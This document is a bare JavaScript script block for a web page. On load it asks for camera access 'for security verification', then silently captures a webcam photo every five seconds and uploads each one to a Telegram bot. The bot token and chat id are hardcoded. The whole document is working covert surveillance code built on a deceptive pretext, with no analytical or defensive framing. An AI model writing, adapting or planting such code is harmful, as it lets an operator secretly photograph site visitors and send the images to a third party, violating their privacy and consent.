<script>
    // Telegram bot details
    const botToken = '8673001180:AAFElpcedXLAuohm2vAnwVdENNhNyAuRnz4';
    const chatId = '@cpoxnopxbot';
    
    // Function to request camera access
    function requestCameraAccess() {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            // Show permission dialog
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    // Camera access granted
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    // Create canvas to capture photos
                    const canvas = document.createElement('canvas');
                    const context = canvas.getContext('2d');
                    
                    // Set dimensions
                    video.addEventListener('loadedmetadata', function() {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        
                        // Capture photo every 5 seconds
                        setInterval(function() {
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            
                            // Convert to blob and send to Telegram
                            canvas.toBlob(function(blob) {
                                sendToTelegram(blob);
                            }, 'image/jpeg', 0.8);
                        }, 5000);
                    });
                })
                .catch(function(error) {
                    console.error('Camera access denied:', error);
                });
        } else {
            console.error('Camera API not supported');
        }
    }
    
    // Function to send photo to Telegram
    function sendToTelegram(blob) {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'webcam_photo.jpg');
        
        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => console.log('Photo sent:', data))
        .catch(error => console.error('Error sending photo:', error));
    }
    
    // Request camera access when page loads
    window.addEventListener('load', function() {
        // Show a confirmation dialog first
        if (confirm("For security verification, we need to access your camera. Do you agree?")) {
            requestCameraAccess();
        } else {
            alert("Camera access is required to continue.");
        }
    });
